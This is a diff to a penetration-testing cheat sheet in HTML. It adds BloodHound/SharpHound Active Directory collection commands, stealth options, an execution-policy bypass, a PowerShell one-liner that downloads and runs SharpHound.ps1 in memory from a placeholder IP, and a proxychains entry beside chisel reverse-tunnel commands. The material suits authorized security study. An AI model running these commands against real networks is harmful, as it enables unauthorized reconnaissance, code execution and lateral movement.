@@ -5719,6 +5719,40 @@ ls \\FILES04\docshare\docs\do-not-share
 cat \\FILES04\docshare\docs\do-not-share\start-email.txt
 
 </code></pre>
+<h3 id="bloodhound"><a class="header" href="#bloodhound">BloodHound</a></h3>
+<h4 id="ingestors"><a class="header" href="#ingestors">Ingestors</a></h4>
+<pre><code># Standard local execution
+./SharpHound.exe --CollectionMethods All,GPOLocalGroup
+Invoke-BloodHound -CollectionMethod All,GPOLocalGroup
+Invoke-BloodHound -CollectionMethod All -CompressData -RemoveCSV
+Invoke-BloodHound -CollectionMethod LoggedOn
+
+# Specify different domain and run in stealth mode and collect only RDP data
+Invoke-BloodHound --d &lt;Domain&gt; --Stealth --CollectionMethod RDP
+
+# Run in context of different user
+runas.exe /netonly /user:domain\user 'powershell.exe -nop -exec bypass'
+
+# Download and execute in memory
+powershell.exe -exec Bypass -C "IEX(New-Object Net.Webclient).DownloadString('http://&lt;IP&gt;:/SharpHound.ps1');Invoke-BloodHound"
+
+# Metasploit
+use post/windows/gather/bloodhound       
+</code></pre>
+<h4 id="custom-queries"><a class="header" href="#custom-queries">Custom Queries</a></h4>
+<pre><code>Replace the `customqueries.json` with one of the below files to update the custom queries within Bloodhound. Remember to restart Bloodhound after changing the JSON file.
+
+**Locate custom queries file**
+
+sudo find / -type f -name customqueries.json 2&gt;/dev/null
+
+Add one of the queries below:
+https://github.com/CompassSecurity/BloodHoundQueries
+https://github.com/hausec/Bloodhound-Custom-Queries
+https://gist.github.com/seajaysec/a4d4a545047a51053d52cba567f78a9b
+
+
+</code></pre>
 <h3 id="automate-1"><a class="header" href="#automate-1">Automate</a></h3>
 <pre><code>
 Import-Module .\Sharphound.ps1
@@ -5974,6 +6008,9 @@ try everything just with proxychains command once you get access to another netw
 # For reverse shell
 .\chisel_1.9.1_windows_amd64.exe client 192.168.45.164:8001 0.0.0.0:9999:192.168.45.164:9999
 
+# Add to Proxychains.conf file
+
+socks5 127.0.0.1 1080
 
 #Random Variations
 ./chisel client 192.168.45.225:8001 R:socks
